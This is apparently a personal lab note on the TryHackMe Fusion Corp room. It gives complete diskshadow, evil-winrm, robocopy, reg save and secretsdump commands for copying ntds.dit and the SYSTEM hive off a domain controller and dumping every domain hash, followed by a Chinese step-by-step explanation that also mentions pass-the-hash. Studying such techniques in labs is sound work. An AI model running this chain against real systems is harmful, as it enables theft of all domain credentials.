[[BackupOperatorToolkit.exe]]

https://your-it-note.blogspot.com/2024/11/challenge-8-poseidon1.html

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
![[Pasted image 20251128165658.png]]

https://happycamper84.medium.com/fusion-corp-tryhackme-walkthrough-5a424effa225


Create a backup.txt on Kali containing:

set verbose onX  
set metadata C:\Windows\Temp\meta.cabX  
set context clientaccessibleX  
set context persistentX  
begin backupX  
add volume C: alias cdriveX  
createX  
expose %cdrive% E:X  
end backupX

Then via evil-winrm logged in as jmurphy:

New-Item -Type Directory C:\Temp  
Set-Location C:\Temp  
upload /home/kali/Downloads/exploits/backup.txt  
diskshadow /s backup.txt  
  
#Once that's done  
robocopy /b E:\Windows\ntds . ntds.dit  
reg save hklm\system c:\temp\system  
download ntds.dit /home/kali/Downloads/Pilfered/Fusion/ntds.dit  
download C:\Temp\system /home/kali/Downloads/Pilfered/Fusion/system

#Dump NTDS.dit offline on Kali  
cd /home/kali/Downloads/Pilfered/Fusion  
python3 /home/kali/Downloads/impacket-master/examples/secretsdump.py -ntds ntds.dit -system system LOCAL


这段脚本和命令展示了一种经典的 **Active Directory 凭证转储（Credential Dumping）** 技术。攻击者利用 Windows 自带的合法工具（如 `diskshadow` 和 `robocopy`），也就是所谓的 "Living off the Land" (LotL) 策略，来绕过文件锁定机制，获取域控制器上的数据库文件（`ntds.dit`），最后在本地（Kali Linux）离线提取哈希值。

以下是该攻击流程的详细中文技术解析：

### 1. 利用 `diskshadow` 创建卷影副本 (Shadow Copy)

Windows 运行时，Active Directory 的数据库文件 `C:\Windows\NTDS\ntds.dit` 被系统独占锁定，无法直接复制。攻击者使用 `diskshadow.exe` 创建 C 盘的卷影副本（快照），从而访问该文件的静态副本。

**`backup.txt` 脚本解析：**

- **`set verbose on`**: 开启详细模式，显示操作细节。
    
- **`set metadata C:\Windows\Temp\meta.cab`**: 设置元数据文件的保存路径（这是 diskshadow 运行所必需的）。
    
- **`set context clientaccessible` / `set context persistent`**: 设置卷影副本的属性，使其在程序退出后依然存在，且能够被系统访问。在 `diskshadow` 的上下文中，`set context clientaccessible` 是一个关键的配置命令，用于定义卷影副本（Shadow Copy）的属性和行为。

简单来说，它的作用是**让创建的卷影副本能够被普通的“客户端”程序（如资源管理器、Robocopy、PowerShell 等）直接访问和读取，而不仅仅是被专用的备份软件访问。**
    
- **`begin backup`**: 开始备份会话。
    
- **`add volume C: alias cdrive`**: 将 C 盘添加到备份列表，并赋予别名 `cdrive`。
    
- **`create`**: 执行创建卷影副本的操作。这是核心步骤，系统会在后台建立 C 盘的时间点快照。
    
- **`expose %cdrive% E:`**: **关键步骤**。将刚刚创建的 C 盘快照挂载（暴露）为 `E:` 盘。此时，`E:` 盘的内容与 `C:` 盘完全一致，但文件没有被锁定。在 `diskshadow` 脚本语法中，`%cdrive%` 中的百分号 `%` 表示这是一个 **变量引用 (Variable Reference)** 或 **别名引用 (Alias Reference)**。**`%...%` 的作用**：这两个百分号告诉解释器，“请把中间的 `cdrive` 当作一个变量，**替换**成它所代表的那个具体的卷影副本 ID”。

这与 Windows 批处理脚本（Batch script）中引用环境变量的方式（如 `%USERNAME%`）非常相似。
    
- **`end backup`**: 结束备份会话。
    

---

### 2. 在目标机器上执行 (Via Evil-WinRM)

攻击者通过 `evil-winrm`（一种利用 WinRM 协议的远程管理工具）以 `jmurphy` 用户身份登录，并执行以下操作：

1. **`New-Item ...` / `Set-Location ...`**: 在 `C:\Temp` 创建工作目录并进入。
    
2. **`upload ...`**: 将攻击者机器上的 `backup.txt` 脚本上传到目标机器。
    
3. **`diskshadow /s backup.txt`**: 运行 `diskshadow` 工具并加载脚本。`/s` 参数代表 **Script (脚本)**。
    
    - **结果**：目标机器上会出现一个新的 `E:` 盘，它是 C 盘的卷影副本。
        

---

### 3. 窃取关键文件 (Exfiltration)

在卷影副本创建后，攻击者需要获取两个核心文件来破解凭证：

- **`robocopy /b E:\Windows\ntds . ntds.dit`**:
    
    - 使用 `robocopy` 从 `E:` 盘（卷影副本）复制 `ntds.dit` 到当前目录。
        
    - `/b` 参数表示使用 **Backup API** 模式，这允许操作者即使在没有完全访问权限的情况下（假设其属于 Backup Operators 组）也能读取文件。
        
    - 因为是从 `E:` 盘复制，所以不会遇到“文件被其他进程使用”的错误。
        
- **`reg save hklm\system c:\temp\system`**:
    
    - 导出注册表的 `HKEY_LOCAL_MACHINE\SYSTEM` 配置单元 (Hive)。
        
    - **原因**：`ntds.dit` 中的数据是加密的。解密这些数据需要存储在 SYSTEM Hive 中的 **Boot Key (SysKey)**。没有这个文件，`ntds.dit` 毫无用处。
        

---

### 4. 数据回传与离线提取 (Offline Extraction)

- **`download ...`**: 将窃取到的 `ntds.dit` 和 `system` 文件从受害主机下载回攻击者的 Kali Linux 机器。
    
- **`python3 ... secretsdump.py ...`**:
    
    - 这是 Impacket 工具包中的脚本，用于解析和提取凭证。
        
    - **`-ntds ntds.dit`**: 指定 AD 数据库文件。
        
    - **`-system system`**: 指定包含解密密钥的注册表文件。
        
    - **`LOCAL`**: 指示在本地解析文件。
        
    - **结果**：脚本会输出域内所有用户的 NTLM 哈希、Kerberos 密钥以及明文密码历史（如果可用）。攻击者随后可利用这些哈希进行“哈希传递”（Pass-the-Hash）攻击或离线破解。
**对于转储域控制器（Active Directory）的所有域用户凭证来说，你不需要 SAM 文件，只需要 `ntds.dit` 和 `SYSTEM`。**

之所以会有这种区别，是因为**域账号**和**本地账号**存储的位置完全不同。

以下是详细的原因分析：

### 1. 不同的数据库存储不同的账号

Windows 有两套完全独立的账号数据库：
|**数据库文件**|**存储内容**|**适用范围**|
|---|---|---|
|**`ntds.dit`**|**域用户** (Domain Users)<br><br>  <br><br>KRBTGT, 域管理员, 所有员工账号|**整个 Active Directory 域**<br><br>  <br><br>(只有域控制器上有此文件)|
|**`SAM`**|**本地用户** (Local Users)<br><br>  <br><br>本地管理员 (.\Administrator), 本地访客|**仅限当前那一台机器**|


- **你的目标**: 既然你都在费劲窃取 `ntds.dit`，说明你的目标是拿到**所有域用户**的哈希（Golden Ticket, Domain Admin 等）。这些数据全都在 `ntds.dit` 里。
    
- **SAM 的角色**: 域控制器（DC）虽然也有 SAM 文件，但里面只存了 DC 本地的恢复账号（DSRM 账号）等极少数信息。对于控制整个域来说，SAM 里的数据价值远不如 `ntds.dit`。
    

### 2. SYSTEM 文件的作用 (它是万能钥匙)

你可能会问，既然数据在 `ntds.dit` 里，为什么还需要 `SYSTEM` 文件？

因为 `ntds.dit` 是被加密的。为了解密它，你需要一把“主钥匙”，这把钥匙藏在 `SYSTEM` 注册表文件中。

- **解密链条 (Domain Dump)**:
    
    1. **SYSTEM 文件** $\rightarrow$ 提取出 **Boot Key (SysKey)**。
        
    2. **Boot Key** $\rightarrow$ 解密 `ntds.dit` 内部的 **PEK (Password Encryption Key)**。
        
    3. **PEK** $\rightarrow$ 解密 `ntds.dit` 中存储的所有**用户哈希**。
        

在这个链条中，**SAM 文件完全没有参与**。

### 3. 什么时候你会需要 SAM？

只有在以下这种情况下，你才需要 `SAM` + `SYSTEM`：

- 你入侵的不是域控制器，而是一台**普通的 Windows 工作站或服务器**。
    
- 或者，你确实想知道这台域控制器的**本地管理员密码**（例如为了以后在该机器脱离域环境时登录，或者破解 DSRM 密码）。
    

### 总结

- **抓域控 (Domain Dominance)**: 需要 `ntds.dit` + `SYSTEM`。 (SAM 可有可无)
    
- **抓单机 (Local Admin)**: 需要 `SAM` + `SYSTEM`。 (`ntds.dit` 不存在)
    

所以在你的脚本中，因为目标是利用卷影副本窃取域数据库，忽略 SAM 是完全正确且高效的。
在 Windows 系统中，**SAM** 代表：

### **Security Account Manager (安全账户管理器)**
